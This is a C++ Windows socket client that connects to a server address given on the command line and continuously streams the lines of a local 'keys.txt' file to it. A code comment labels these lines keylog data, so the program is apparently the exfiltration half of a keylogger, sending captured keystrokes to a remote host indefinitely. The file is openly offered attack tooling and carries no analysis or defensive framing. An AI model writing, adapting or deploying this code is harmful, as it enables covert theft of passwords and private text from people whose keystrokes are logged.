#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601 // Windows 7 or later
#endif
#include <iostream>
#include <fstream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <string>
#include <thread>
#include <cstring>
#pragma comment(lib, "ws2_32.lib")
#define DEFAULT_PORT "27015"

// g++ -o client client.cpp -lws2_32

const char* INITIAL_MESSAGE = "The client is ready to send data.";

int init_client(const char* server_address);

int main(int argc, char* argv[]){
    if (argc < 2) {
        std::cout << "Usage: " << argv[0] << " <server_address>" << std::endl;
        return 1;
    }
    init_client(argv[1]);
    return 0;
}

int init_client(const char* server_address){
    WSADATA wsaData;
    int iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0) {
        std::cout << "WSAStartup failed: " << iResult << std::endl;
        return 1;
    }
    
    struct addrinfo *result = NULL, *ptr = NULL, hints;

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    iResult = getaddrinfo(server_address, DEFAULT_PORT, &hints, &result);
    if (iResult != 0) {
        std::cout << "getaddrinfo failed: " << iResult << std::endl;
        WSACleanup();
        return 1;
    }

    SOCKET ConnectSocket = INVALID_SOCKET;

    // Attempt to connect to the first address returned by
    // the call to getaddrinfo
    std::cout << "Client initialised." << std::endl;

    std::cout << "Connecting to server at " << server_address << ":" << DEFAULT_PORT << std::endl;    

    // Try each address until we successfully connect
    for(ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        // Create a SOCKET for connecting to server
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            printf("Error at socket(): %ld\n", WSAGetLastError());
            continue;
        }

        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break; // Successfully connected
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        WSACleanup();
        return 1;
    }
    std::cout << "Connected to server." << std::endl;

    // Send an initial buffer
    iResult = send(ConnectSocket, INITIAL_MESSAGE, (int) strlen(INITIAL_MESSAGE), 0);
    if (iResult == SOCKET_ERROR) {
        printf("send failed: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    std::ifstream keysFile("keys.txt");
    if (!keysFile.is_open()) {
        std::cout << "Error: Could not open keys.txt" << std::endl;
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    std::string line;
    int counter = 0;
    int backoff = 100; // Start with 100ms
    const int max_backoff = 5000; // Max 5 seconds

    while (true) {
        // Try to read next line from file
        if (std::getline(keysFile, line)) {
            // Format the keylog data
            std::string data = line + "\n";
            
            iResult = send(ConnectSocket, data.c_str(), (int)data.length(), 0);
            if (iResult == SOCKET_ERROR) {
                printf("send failed: %d\n", WSAGetLastError());
                break;
            }
            
            std::cout << "Sent: " << data;
            counter++;
            backoff = 100; // Reset backoff on successful read
        } else {
            // If we reached end of file, wait for new data
            if (keysFile.eof()) {
                keysFile.clear(); // Clear EOF flag
                Sleep(backoff); // Wait before trying to read more data
                if (backoff < max_backoff) backoff *= 2; // Exponential backoff
                if (backoff > max_backoff) backoff = max_backoff;
            } else {
                // Some other error occurred
                std::cout << "Error reading from file" << std::endl;
                Sleep(10000);
            }
        }
    }

    // shutdown the connection since no more data will be sent
    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        printf("shutdown failed: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    closesocket(ConnectSocket);
    WSACleanup();
    return 0;
}